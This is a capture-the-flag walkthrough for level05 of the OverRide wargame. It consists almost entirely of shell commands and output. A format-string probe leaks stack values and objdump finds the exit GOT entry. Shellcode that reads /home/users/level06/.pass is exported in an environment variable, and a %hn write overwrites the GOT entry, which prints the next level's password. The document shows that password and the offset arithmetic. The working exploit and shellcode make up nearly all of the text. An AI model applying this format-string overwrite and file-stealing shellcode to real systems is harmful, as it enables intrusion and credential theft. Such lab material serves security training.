# level05

```
level05@OverRide:~$ perl -e 'print "aaaa_" . "%08x "x12 . "\n"' | ./level05
aaaa_00000064 f7fcfac0 f7ec3af9 ffffd6df ffffd6de 00000000 ffffffff ffffd764 f7fdb000 61616161 3830255f 30252078
```

```
level05@OverRide:~$ objdump -R level05 | grep exit
080497e0 R_386_JUMP_SLOT   exit
```

```
level05@OverRide:~$ export SHELLCODE=`perl -e 'print "A"x100 . "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"'`
level05@OverRide:~$ /tmp/getenv
0xffffd845
level05@OverRide:~$ perl -e 'print pack("V", 0x080497e0) . pack("V", 0x080497e2) . "%55357u%10\$hn" . "%10170u%11\$hn"' | ./level05
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
`0xffff - 0xd845 = 0x27ba = 10170`; `0xd845 - 0x8 = 0xd83d = 55357`
